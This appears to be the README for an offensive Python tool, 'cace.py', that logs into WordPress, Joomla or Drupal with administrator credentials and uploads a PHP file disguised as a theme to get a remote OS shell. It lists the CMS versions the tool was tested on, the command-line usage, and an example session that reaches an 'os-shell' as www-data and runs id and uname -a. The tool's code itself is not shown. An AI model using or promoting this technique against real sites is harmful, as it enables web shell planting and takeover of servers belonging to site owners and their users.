```
CMS Admin Command Execution

Trying to execute php code via admin panel.

Requirement:  
Python 2.7  
Python Requests lib (http://docs.python-requests.org/en/latest/)  
  
Tested on:  
Wordpress 4.1.1(latest); 3.9.3; 3.8; 3.7; 3.5; 3.4; 3.0; 2.7  
Joomla 3.4.1(latest); 2.5.28; 1.5.26  
Drupal 7.36(latest stable)  

usage: cace.py [-h] -c CMS -u URL -l LOGIN -p PWD  
  
CMS Admin Command Execution  
  
optional arguments:  
  -h, --help            show this help message and exit  
  -c CMS, --cms CMS     1 - Wordpress >= 2.7; 2 - Joomla; 3 - Drupal 7.*  
  -u URL, --url URL     Url to CMS folder, example http://1.2.3.4/blog/  
  -l LOGIN, --login LOGIN  
                        Administrator login  
  -p PWD, --pwd PWD     Administrator password  
    
Example:  
   
test@ubuntu:~$ python cace.py -c 1 -u http://127.0.0.1/wp35/ -l admin -p admin  
[*] Trying to get upload form token for WP >= 3.9.  
[-] Failed to get token for WP >= 3.9.  
[*] Trying to get upload form token for WP <= 3.8.5.  
[*] Uploading php file as theme.  
[*] Trying to get os-shell.  
os-shell>id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
os-shell>uname -a  
Linux ubuntu 3.16.0-33-generic #44~14.04.1-Ubuntu SMP Fri Mar 13 10:33:29 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux  
os-shell>exit
